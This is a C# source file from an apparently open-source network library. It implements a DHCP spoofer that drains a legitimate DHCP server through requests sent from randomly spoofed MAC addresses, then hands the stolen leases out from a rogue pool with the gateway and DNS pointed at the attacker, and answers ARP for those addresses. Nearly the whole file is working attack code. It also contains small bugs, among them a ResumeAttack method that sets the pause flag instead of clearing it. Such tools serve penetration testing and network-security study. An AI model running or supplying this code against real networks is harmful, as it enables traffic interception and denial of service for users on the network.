// This source file is part of the eEx Network Library
//
// Author: 	    Emanuel Jöbstl <emi@eex-dev.net>
// Weblink: 	http://network.eex-dev.net
//		        http://eex.codeplex.com
//
// Licensed under the GNU Library General Public License (LGPL) 
//
// (c) eex-dev 2007-2011

using System;
using System.Collections.Generic;
using System.Text;
using eExNetworkLibrary.DHCP;
using System.Net;
using System.Threading;
using eExNetworkLibrary.Ethernet;
using eExNetworkLibrary.IP;

namespace eExNetworkLibrary.Attacks.Spoofing
{
    /// <summary>
    /// This class provides the function of a DHCP server but adds some attack functionalities. 
    /// It is capable of forcing an existing DHCP server into starvation by requesting all its addresses
    /// with spoofed MAC addresses. Further this DHCP spoofer is capable of adding the stolen addresses
    /// to its own DHCP pool to release them, which does not work every time because the real DHCP server will respond
    /// with a DHCP NACK. The solution to this problem is to fill the pool of this DHCP spoofer with addresses for a diffrent subnet,
    /// then attack the original DHCP server and finally route between the subnets
    /// </summary>
    public class DHCPSpoofer : DHCPServer, IAttack
    {
        private Dictionary<DHCP.DHCPPoolItem, MACAddress> dictPoolItemSpoofedMAC;
        private Dictionary<IPAddress, MACAddress> dictIPSpoofedMACs;
        private List<MACAddress> lSpoofedMACs;
        private System.Timers.Timer tRequestTimer;
        private bool bStealAdresses;
        private Random rRandom;
        private bool bRedirectDNSServer;
        private string strHostnameToSpoof;
        private bool bAnswerARPRequests;
        private List<int> lOpenClientTransactions;
        private bool bRedirectGateway;
        private int iSleepDuration;
        private bool bPause;
        private List<IPAddress> lServers;

        /// <summary>
        /// Stops leasing and stealing addresses and releases all stolen addresses to avoid denial of service situations.
        /// </summary>
        public override void Cleanup()
        {
            base.Cleanup();
            bPause = true;
            ReleasePools();
        }

        /// <summary>
        /// Forces this DHCP spoofer to release all stolen addresses (Experimental)
        /// </summary>
        public void ReleasePools()
        {
            foreach (DHCPPool pPool in DHCPPools)
            {
                foreach (DHCPPoolItem dhcpItem in pPool.Pool)
                {
                    //DHCP Release:
                    //My IP in OfferedAddress
                    //DHCP TLVs: Client ID, Server ID, DHCP Type = Release

                    if (dictPoolItemSpoofedMAC.ContainsKey(dhcpItem) && dhcpItem.DHCPServer != null && dhcpItem.DHCPServerMAC != null)
                    {
                        DHCPFrame newDHCPFrame = new DHCPFrame();
                        newDHCPFrame.ClientAddress = IPAddress.Any;
                        newDHCPFrame.ClientMac = dictPoolItemSpoofedMAC[dhcpItem];
                        newDHCPFrame.Hardwarelen = 6;
                        newDHCPFrame.HardwareType = eExNetworkLibrary.HardwareAddressType.Ethernet;
                        newDHCPFrame.Hops = 0;
                        newDHCPFrame.MessageType = DHCPType.BootReply;
                        newDHCPFrame.OfferedAddress = dhcpItem.Address;
                        newDHCPFrame.RelayAddress = IPAddress.Any;
                        newDHCPFrame.RequestedFile = "";
                        newDHCPFrame.RequestedServerName = "";
                        newDHCPFrame.Secs = 0;
                        newDHCPFrame.ServerAddress = dhcpItem.DHCPServer;
                        newDHCPFrame.ValidIPFlag = true;
                        newDHCPFrame.TransactionID = rRandom.Next(65535);

                        DHCPTLVItem tlvItem = new DHCPTLVItem();
                        tlvItem.DHCPOptionType = DHCPOptions.DHCPMessageType;
                        tlvItem.Data = new byte[] { (byte)DHCPMessageType.Release };

                        newDHCPFrame.AddDHCPTLVItem(tlvItem);

                        tlvItem = new DHCPTLVItem();
                        tlvItem.DHCPOptionType = DHCPOptions.ClientID;
                        byte[] bIDData = new byte[7];
                        bIDData[0] = (byte)HardwareAddressType.Ethernet;
                        dictPoolItemSpoofedMAC[dhcpItem].AddressBytes.CopyTo(bIDData, 1);
                        tlvItem.Data = bIDData;

                        newDHCPFrame.AddDHCPTLVItem(tlvItem);

                        tlvItem = new DHCPTLVItem();
                        tlvItem.DHCPOptionType = DHCPOptions.DHCPServerID;
                        tlvItem.Data = dhcpItem.DHCPServer.GetAddressBytes();

                        newDHCPFrame.AddDHCPTLVItem(tlvItem);

                        UDP.UDPFrame newUDPFrame = new eExNetworkLibrary.UDP.UDPFrame();
                        newUDPFrame.DestinationPort = iDHCPOutPort;
                        newUDPFrame.SourcePort = iDHCPInPort;
                        newUDPFrame.EncapsulatedFrame = newDHCPFrame;

                        IP.IPv4Frame newIPv4Frame = new eExNetworkLibrary.IP.IPv4Frame();
                        newIPv4Frame.Version = 4;
                        newIPv4Frame.DestinationAddress = dhcpItem.DHCPServer;
                        newIPv4Frame.SourceAddress = dhcpItem.Address;
                        newIPv4Frame.Protocol = eExNetworkLibrary.IP.IPProtocol.UDP;
                        newIPv4Frame.EncapsulatedFrame = newUDPFrame;
                        newIPv4Frame.Identification = (uint)IncrementIPIDCounter();
                        newIPv4Frame.TimeToLive = 128;

                        Ethernet.EthernetFrame ethFrame = new eExNetworkLibrary.Ethernet.EthernetFrame();
                        ethFrame.Destination = dhcpItem.DHCPServerMAC;
                        ethFrame.Source = dictPoolItemSpoofedMAC[dhcpItem];
                        ethFrame.EtherType = eExNetworkLibrary.EtherType.IPv4;
                        ethFrame.EncapsulatedFrame = newIPv4Frame;

                        TrafficDescriptionFrame tdFrame = new TrafficDescriptionFrame(null, DateTime.Now);
                        tdFrame.EncapsulatedFrame = ethFrame;

                        foreach (IPInterface ipi in GetInterfacesForAddress(newIPv4Frame.DestinationAddress))
                        {
                            ipi.Send(tdFrame);
                        }

                        lSpoofedMACs.Remove(dictPoolItemSpoofedMAC[dhcpItem]);
                        dictPoolItemSpoofedMAC.Remove(dhcpItem);
                        RemovePoolItem(dhcpItem, pPool, null);
                        Thread.Sleep(iSleepDuration);
                    }
                }
            }

            dictPoolItemSpoofedMAC.Clear();
            dictIPSpoofedMACs.Clear();
        }
        

        /// <summary>
        /// Adds an interface to this DHCP spoofer
        /// </summary>
        /// <param name="ipInterface">The interface to add only ethernet Interfaces are supported</param>
        public override void AddInterface(IPInterface ipInterface)
        {
            if (ipInterface.GetType() != typeof(EthernetInterface))
            {
                throw new ArgumentException("Only ethernet interfaces are supported for ARP scanning");
            }
            base.AddInterface(ipInterface);
        }

        /// <summary>
        /// This event is fired when an address is stolen and placed into this spoofer's pool
        /// </summary>
        public event DHCPServerEventHandler AddressStolen;

        #region Props

        /// <summary>
        /// Gets or sets the hostname which should be spoofed when stealing addresses
        /// </summary>
        public string HostenameToSpoof
        {
            set
            {
                strHostnameToSpoof = value;
                InvokePropertyChanged();
            }
            get { return strHostnameToSpoof; }
        }

        /// <summary>
        /// Gets or sets the interval for stealing addresses in milliseconds
        /// </summary>
        public int RequestInterval
        {
            get { return (int)tRequestTimer.Interval; }
            set
            {
                tRequestTimer.Interval = value;
                iSleepDuration = value;
                InvokePropertyChanged();
            }
        }

        /// <summary>
        /// Gets or sets a bool which indicates if addresses should be stolen
        /// </summary>
        public bool StealAdresses
        {
            get { return bStealAdresses; }
            set
            {
                bStealAdresses = value;
                InvokePropertyChanged();
            }
        }

        /// <summary>
        /// Gets or sets a bool which indicates if ARP requests for stolen addresses should be answered
        /// </summary>
        public bool AnswerARPRequests
        {
            get { return bAnswerARPRequests; }
            set
            {
                bAnswerARPRequests = value;
                InvokePropertyChanged();
            }
        }

        /// <summary>
        /// Gets or sets a bool which indicates if the DNS server of stolen leases should be redirected to the attacker's host or the value of DNSAddress
        /// </summary>
        public bool RedirectDNSServer
        {
            get { return bRedirectDNSServer; }
            set
            {
                bRedirectDNSServer = value;
                InvokePropertyChanged();
            }
        }

        /// <summary>
        /// Gets or sets a bool which indicates if the geateway of stolen leases should be redirected GatewayAddress
        /// </summary>
        public bool RedirectGateway
        {
            get { return bRedirectGateway; }
            set
            {
                bRedirectGateway = value;
                InvokePropertyChanged();
            }
        }

        #endregion

        /// <summary>
        /// Gets the spoofed MAC for a stolen DHCP lease
        /// </summary>
        /// <param name="dhpItem">The DHCP lease to get the spoofed MAC address for</param>
        /// <returns>The spoofed MAC for a stolen DHCP lease</returns>
        public MACAddress GetSpoofedAddressforItem(DHCPPoolItem dhpItem)
        {
            if (dictPoolItemSpoofedMAC.ContainsKey(dhpItem))
            {
                return dictPoolItemSpoofedMAC[dhpItem];
            }
            return null;
        }
     
        /// <summary>
        /// Creates a new instance of this class
        /// </summary>
        public DHCPSpoofer()
        {
            bAnswerARPRequests = false;
            strHostnameToSpoof = "badcable";
            lOpenClientTransactions = new List<int>();
            bStealAdresses = false;
            dictPoolItemSpoofedMAC = new Dictionary<DHCPPoolItem, MACAddress>();
            tRequestTimer = new System.Timers.Timer();
            lSpoofedMACs = new List<MACAddress>();
            tRequestTimer.AutoReset = true;
            tRequestTimer.Elapsed += new System.Timers.ElapsedEventHandler(tRequestTimer_Elapsed);
            tRequestTimer.Interval = 2000;
            iSleepDuration = 2000;
            rRandom = new Random();
            lServers = new List<IPAddress>();
            dictIPSpoofedMACs = new Dictionary<IPAddress, MACAddress>();
            bRedirectGateway = true;
            bPause = false;
            bRedirectDNSServer = true;
        }

        void tRequestTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (bStealAdresses && !bPause)
            {
                //Send out a spoofed DHCPDiscoverPacket.
                if (lInterfaces.Count > 0)
                {
                    #region StealAddresses

                    MACAddress macSpoofedAddress = new MACAddress(new byte[] { 00, 0x1D, 0xE5, (byte)rRandom.Next(256), (byte)rRandom.Next(256), (byte)rRandom.Next(256) });

                    DHCPFrame dhcFrame = new DHCPFrame();
                    dhcFrame.ClientAddress = IPAddress.Any;
                    dhcFrame.ClientMac = macSpoofedAddress;
                    dhcFrame.Hardwarelen = 6;
                    dhcFrame.HardwareType = eExNetworkLibrary.HardwareAddressType.Ethernet;
                    dhcFrame.Hops = 0;
                    dhcFrame.MessageType = DHCPType.BootRequest;
                    dhcFrame.OfferedAddress = IPAddress.Any;
                    dhcFrame.RelayAddress = IPAddress.Any;
                    dhcFrame.RequestedFile = "";
                    dhcFrame.RequestedServerName = "";
                    dhcFrame.Secs = 0;
                    dhcFrame.ServerAddress = IPAddress.Any;
                    dhcFrame.ValidIPFlag = true;
                    dhcFrame.TransactionID = rRandom.Next();

                    DHCPTLVItem tlvItem = new DHCPTLVItem();
                    tlvItem.DHCPOptionType = DHCPOptions.DHCPMessageType;
                    tlvItem.Data = new byte[] { (byte)DHCPMessageType.Discover };

                    dhcFrame.AddDHCPTLVItem(tlvItem);

                    tlvItem = new DHCPTLVItem();
                    tlvItem.DHCPOptionType = DHCPOptions.ClientID;
                    byte[] bIDData = new byte[7];
                    bIDData[0] = (byte)HardwareAddressType.Ethernet;
                    macSpoofedAddress.AddressBytes.CopyTo(bIDData, 1);
                    tlvItem.Data = bIDData;

                    dhcFrame.AddDHCPTLVItem(tlvItem);

                    tlvItem = new DHCPTLVItem();
                    tlvItem.DHCPOptionType = DHCPOptions.AddressRequest;
                    tlvItem.Data = IPAddress.Any.GetAddressBytes();

                    dhcFrame.AddDHCPTLVItem(tlvItem);

                    tlvItem = new DHCPTLVItem();
                    tlvItem.DHCPOptionType = DHCPOptions.Hostname;
                    tlvItem.Data = Encoding.ASCII.GetBytes(strHostnameToSpoof + iIPIDCounter);

                    dhcFrame.AddDHCPTLVItem(tlvItem);

                    tlvItem = new DHCPTLVItem();
                    tlvItem.DHCPOptionType = DHCPOptions.ParameterList;
                    tlvItem.Data = new byte[] { (byte)DHCPOptions.SubnetMask, (byte)DHCPOptions.DomainNameServer, (byte)DHCPOptions.DomainName, (byte)DHCPOptions.Router };

                    dhcFrame.AddDHCPTLVItem(tlvItem);

                    UDP.UDPFrame udpFrame = new eExNetworkLibrary.UDP.UDPFrame();
                    udpFrame.DestinationPort = iDHCPOutPort;
                    udpFrame.SourcePort = iDHCPInPort;
                    udpFrame.EncapsulatedFrame = dhcFrame;

                    IP.IPv4Frame ipv4Frame = new eExNetworkLibrary.IP.IPv4Frame();
                    ipv4Frame.Version = 4;
                    ipv4Frame.DestinationAddress = IPAddress.Broadcast;
                    ipv4Frame.SourceAddress = IPAddress.Any;
                    ipv4Frame.Protocol = eExNetworkLibrary.IP.IPProtocol.UDP;
                    ipv4Frame.EncapsulatedFrame = udpFrame;
                    ipv4Frame.TimeToLive = 128;
                    ipv4Frame.Identification = (uint)IncrementIPIDCounter();

                    Ethernet.EthernetFrame ethFrame = new eExNetworkLibrary.Ethernet.EthernetFrame();
                    ethFrame.Destination = new MACAddress(new byte[] { 255, 255, 255, 255, 255, 255 });
                    ethFrame.Source = macSpoofedAddress;
                    ethFrame.EtherType = eExNetworkLibrary.EtherType.IPv4;
                    ethFrame.EncapsulatedFrame = ipv4Frame;

                    TrafficDescriptionFrame tdFrame = new TrafficDescriptionFrame(null, DateTime.Now);
                    tdFrame.EncapsulatedFrame = ethFrame;

                    foreach (IPInterface ipi in lInterfaces)
                    {
                        ipi.Send(tdFrame);
                        lOpenClientTransactions.Add(dhcFrame.TransactionID);
                        lSpoofedMACs.Add(ethFrame.Source);
                    }

                    #endregion
                }
            }
        }

        /// <summary>
        /// Starts the underlying DHCP server and the stealing of addresses
        /// </summary>
        public override void Start()
        {
            tRequestTimer.Start();
            base.Start();
        }

        /// <summary>
        /// Stops the underlying DHCP server
        /// </summary>
        public override void Stop()
        {
            base.Stop();
        }

        /// <summary>
        /// Tries to extract a DHCP frame from this frame and forwards it to the HandleDHCPFrame method
        /// </summary>
        /// <param name="fInputFrame">The frame to handle</param>
        protected override void HandleTraffic(Frame fInputFrame)
        {
            Ethernet.EthernetFrame ethFrame = GetEthernetFrame(fInputFrame);
            if (ethFrame == null || lSpoofedMACs.Contains(ethFrame.Source))
            {
                return; //own frame.
            }
            if (bPause)
            {
                return; //Pausing.
            }

            base.HandleTraffic(fInputFrame);

            ARP.ARPFrame arpFrame = GetARPFrame(fInputFrame);
            TrafficDescriptionFrame tdf = (TrafficDescriptionFrame)GetFrameByType(fInputFrame, FrameTypes.TrafficDescriptionFrame);

            #region Reply to ARP Requests

            if (arpFrame != null && bAnswerARPRequests)
            {
                if (dictIPSpoofedMACs.ContainsKey(arpFrame.DestinationIP))
                {
                    ARP.ARPFrame newARPFrame = new eExNetworkLibrary.ARP.ARPFrame();
                    newARPFrame.SourceIP = arpFrame.DestinationIP;
                    newARPFrame.SourceMAC = dictIPSpoofedMACs[arpFrame.DestinationIP];
                    newARPFrame.DestinationIP = arpFrame.SourceIP;
                    newARPFrame.DestinationMAC = arpFrame.DestinationMAC;
                    newARPFrame.HardwareAddressType = eExNetworkLibrary.HardwareAddressType.Ethernet;
                    newARPFrame.Operation = eExNetworkLibrary.ARP.ARPOperation.Reply;
                    newARPFrame.ProtocolAddressType = eExNetworkLibrary.EtherType.IPv4;

                    Ethernet.EthernetFrame newEthframe = new eExNetworkLibrary.Ethernet.EthernetFrame();
                    newEthframe.Destination = arpFrame.SourceMAC;
                    newEthframe.Source = dictIPSpoofedMACs[arpFrame.DestinationIP];
                    newEthframe.EtherType = eExNetworkLibrary.EtherType.ARP;
                    newEthframe.EncapsulatedFrame = newARPFrame;

                    TrafficDescriptionFrame newTDF = new TrafficDescriptionFrame(null, DateTime.Now);
                    newTDF.EncapsulatedFrame = newEthframe;

                    if (tdf != null && tdf.SourceInterface != null)
                    {
                        tdf.SourceInterface.Send(newTDF);
                    }
                }
            }

            #endregion
        }

        /// <summary>
        /// Handles a DHCP frame and sends responses and requests or leases addresses according to its contents
        /// </summary>
        /// <param name="dhcFrame">The DHCP frame to handle</param>
        /// <param name="udpFrame">The UDP frame</param>
        /// <param name="ipv4Frame">The IPv4 frame</param>
        /// <param name="tdf">The traffic description frame</param>
        /// <param name="fInputFrame">The original input frame</param>
        protected override void HandleDHCPFrame(DHCPFrame dhcFrame, UDP.UDPFrame udpFrame, IP.IPFrame ipv4Frame, TrafficDescriptionFrame tdf, Frame fInputFrame)
        {
            base.HandleDHCPFrame(dhcFrame, udpFrame, ipv4Frame, tdf, fInputFrame);

            EthernetFrame ethFrame = GetEthernetFrame(fInputFrame);

            bool bIsOffer = false;
            bool bIsACK = false;

            foreach (DHCPTLVItem tlvItem in dhcFrame.GetDHCPTLVItems())
            {
                if (tlvItem.DHCPOptionType == DHCPOptions.DHCPMessageType)
                {
                    if (dhcFrame.MessageType == DHCPType.BootReply && (DHCPMessageType)tlvItem.Data[0] == DHCPMessageType.Offer && lOpenClientTransactions.Contains(dhcFrame.TransactionID))
                    {
                        bIsOffer = true;
                        break;
                    }
                    if (dhcFrame.MessageType == DHCPType.BootReply && (DHCPMessageType)tlvItem.Data[0] == DHCPMessageType.ACK && lOpenClientTransactions.Contains(dhcFrame.TransactionID))
                    {
                        bIsACK = true;
                        break;
                    }
                }
            }

            if (bIsOffer)
            {
                #region Client Process offer
                IPAddress ipaServer = ipv4Frame.SourceAddress;
                IPAddress myAddress = dhcFrame.OfferedAddress;

                DHCPFrame newDHCPFrame = new DHCPFrame();
                newDHCPFrame.ClientAddress = IPAddress.Any;
                newDHCPFrame.ClientMac = dhcFrame.ClientMac;
                newDHCPFrame.Hardwarelen = 6;
                newDHCPFrame.HardwareType = eExNetworkLibrary.HardwareAddressType.Ethernet;
                newDHCPFrame.Hops = 0;
                newDHCPFrame.MessageType = DHCPType.BootRequest;
                newDHCPFrame.OfferedAddress = IPAddress.Any;
                newDHCPFrame.RelayAddress = IPAddress.Any;
                newDHCPFrame.RequestedFile = "";
                newDHCPFrame.RequestedServerName = "";
                newDHCPFrame.Secs = dhcFrame.Secs + 1;
                newDHCPFrame.ServerAddress = IPAddress.Any;
                newDHCPFrame.ValidIPFlag = true;
                newDHCPFrame.TransactionID = dhcFrame.TransactionID;

                DHCPTLVItem tlvItem = new DHCPTLVItem();
                tlvItem.DHCPOptionType = DHCPOptions.DHCPMessageType;
                tlvItem.Data = new byte[] { (byte)DHCPMessageType.Request };

                newDHCPFrame.AddDHCPTLVItem(tlvItem);

                tlvItem = new DHCPTLVItem();
                tlvItem.DHCPOptionType = DHCPOptions.ClientID;
                byte[] bIDData = new byte[7];
                bIDData[0] = (byte)HardwareAddressType.Ethernet;
                dhcFrame.ClientMac.AddressBytes.CopyTo(bIDData, 1);
                tlvItem.Data = bIDData;

                newDHCPFrame.AddDHCPTLVItem(tlvItem);

                tlvItem = new DHCPTLVItem();
                tlvItem.DHCPOptionType = DHCPOptions.AddressRequest;
                tlvItem.Data = myAddress.GetAddressBytes();

                newDHCPFrame.AddDHCPTLVItem(tlvItem);

                tlvItem = new DHCPTLVItem();
                tlvItem.DHCPOptionType = DHCPOptions.Hostname;
                tlvItem.Data = Encoding.ASCII.GetBytes(strHostnameToSpoof + iIPIDCounter);

                newDHCPFrame.AddDHCPTLVItem(tlvItem);

                tlvItem = new DHCPTLVItem();
                tlvItem.DHCPOptionType = DHCPOptions.DHCPServerID;
                tlvItem.Data = ipaServer.GetAddressBytes();

                newDHCPFrame.AddDHCPTLVItem(tlvItem);

                UDP.UDPFrame newUDPFrame = new eExNetworkLibrary.UDP.UDPFrame();
                newUDPFrame.DestinationPort = iDHCPOutPort;
                newUDPFrame.SourcePort = iDHCPInPort;
                newUDPFrame.EncapsulatedFrame = newDHCPFrame;

                IP.IPv4Frame newIPv4Frame = new eExNetworkLibrary.IP.IPv4Frame();
                newIPv4Frame.Version = 4;
                newIPv4Frame.DestinationAddress = IPAddress.Broadcast;
                newIPv4Frame.SourceAddress = IPAddress.Any;
                newIPv4Frame.Protocol = eExNetworkLibrary.IP.IPProtocol.UDP;
                newIPv4Frame.EncapsulatedFrame = newUDPFrame;
                newIPv4Frame.Identification = (uint)IncrementIPIDCounter();
                newIPv4Frame.TimeToLive = 128;

                ethFrame = new eExNetworkLibrary.Ethernet.EthernetFrame();
                ethFrame.Destination = new MACAddress(new byte[] { 255, 255, 255, 255, 255, 255 });
                ethFrame.Source = dhcFrame.ClientMac;
                ethFrame.EtherType = eExNetworkLibrary.EtherType.IPv4;
                ethFrame.EncapsulatedFrame = newIPv4Frame;

                TrafficDescriptionFrame tdFrame = new TrafficDescriptionFrame(null, DateTime.Now);
                tdFrame.EncapsulatedFrame = ethFrame;

                if (tdf != null && tdf.SourceInterface != null)
                {
                    tdf.SourceInterface.Send(tdFrame);
                }
                #endregion
            }
            else if (bIsACK)
            {
                #region Client Process ACK
                if (tdf != null && tdf.SourceInterface != null)
                {
                    IPInterface ipiSource = tdf.SourceInterface;
                    DHCPPool dhPool = GetPoolForInterface(ipiSource);
                    DHCPPoolItem dpiItem = new DHCPPoolItem();
                    dpiItem.Address = dhcFrame.OfferedAddress;
                    if (dhPool.GetItemForAddress(dpiItem.Address) == null)
                    {
                        if (bRedirectGateway)
                        {
                            if (ipaGateway == null)
                            {
                                dpiItem.Gateway = ipiSource.IpAddresses[0];
                            }
                            else
                            {
                                dpiItem.Gateway = ipaGateway;
                            }
                        }
                        else
                        {
                            IPAddress ipGateway = IPAddress.Any;
                            foreach (DHCPTLVItem tlvItem in dhcFrame.GetDHCPTLVItems())
                            {
                                if (tlvItem.DHCPOptionType == DHCPOptions.Router)
                                {
                                    ipGateway = new IPAddress(tlvItem.Data);
                                    break;
                                }
                            }
                            dpiItem.DNSServer = ipGateway;
                        }
                        if (bRedirectDNSServer)
                        {
                            if (ipaDNSServer == null)
                            {
                                dpiItem.DNSServer = ipiSource.IpAddresses[0];
                            }
                            else
                            {
                                dpiItem.DNSServer = ipaDNSServer;
                            }
                        }
                        else
                        {
                            IPAddress ipDNS = IPAddress.Any;
                            foreach (DHCPTLVItem tlvItem in dhcFrame.GetDHCPTLVItems())
                            {
                                if (tlvItem.DHCPOptionType == DHCPOptions.DomainNameServer)
                                {
                                    ipDNS = new IPAddress(tlvItem.Data);
                                    break;
                                }
                            }
                            dpiItem.DNSServer = ipDNS;
                        }

                        IPAddress ipServer = null;
                        foreach (DHCPTLVItem tlvItem in dhcFrame.GetDHCPTLVItems())
                        {
                            if (tlvItem.DHCPOptionType == DHCPOptions.DHCPServerID)
                            {
                                ipServer = new IPAddress(tlvItem.Data);
                                break;
                            }
                        }

                        dpiItem.DHCPServer = ipServer;

                        dpiItem.Netmask = ipiSource.Subnetmasks[0];
                        dpiItem.DHCPServerMAC = ethFrame.Source;
                        AddPoolItem(dpiItem, dhPool, ipiSource);
                        dictPoolItemSpoofedMAC.Add(dpiItem, dhcFrame.ClientMac);
                        if (dictIPSpoofedMACs.ContainsKey(dpiItem.Address))
                        {
                            dictIPSpoofedMACs.Remove(dpiItem.Address);
                        }
                        dictIPSpoofedMACs.Add(dpiItem.Address, dhcFrame.ClientMac);
                        lServers.Add(ipv4Frame.SourceAddress);
                        InvokeAddressStolen(new DHCPServerEventArgs(dhPool, dpiItem, ipiSource));
                    }
                }
                lOpenClientTransactions.Remove(dhcFrame.TransactionID);
                #endregion
            }
        }

        /// <summary>
        /// Fires the AddressStolen event
        /// </summary>
        /// <param name="args">The event arguments</param>
        protected void InvokeAddressStolen(DHCPServerEventArgs args)
        {
            InvokeExternalAsync(AddressStolen, args);
        }

        /// <summary>
        /// Pauses the leasing and stealing of addresses until ResumeAttack() is called.
        /// </summary>
        public void PauseAttack()
        {
            bPause = true;
        }

        /// <summary>
        /// Resumes the attack which was suspended ba a previous call to PauseAttack().
        /// </summary>
        public void ResumeAttack()
        {
            bPause = true;
        }
    }
}
